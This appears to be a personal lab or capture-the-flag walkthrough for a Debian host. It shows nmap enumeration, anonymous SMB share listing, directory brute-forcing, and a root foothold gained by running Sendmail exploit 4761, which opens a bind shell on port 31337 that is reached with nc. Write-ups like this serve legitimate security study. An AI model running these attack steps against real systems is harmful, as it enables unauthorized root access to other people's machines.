### Enumeration
```
IP=192.168.214.42
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,25,80,139,445,199,60000 -A $IP
```
### Ports
- 22
	- OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
- 80
	- Apache httpd 1.3.33 ((Debian GNU/Linux))
- 25
	- Sendmail 8.13.4/8.13.4/Debian-3sarge3
		- A few exploits
		- 4761
- 139
	- Samba smbd 3.X - 4.X
- 445
	- Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
- 199
	- Linux SNMP multiplexer
- 60000
	- OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
### Foothold
- 25
	- 4761
		- perl 4761.pl 192.168.214.42
		- open ports 31337 up for a bind shell
		- Then we can nc to 31337 and we have root shell
- 445
	- smbclient -N -L //$IP
		- anonymous login successful
		- shares
			- print$
			- IPC$
				- allows anonymous
			- ADMIN$
	- nmap --script smb-vuln* -p135,139,445 $IP
		- Nothing
	- `smbclient -U root //$IP/ADMIN$
		- ifyoudontpwnmeuran00b
			- access denied
- 80
	- Default
		- ![[Pasted image 20240708082728.png]]
		- Binary: `01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 0011 0000 01100010`
		- Binary to ascii: ifyoudontpwnmeuran00b
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
### Lessons Learned
- Read the exploits and try to understand what they do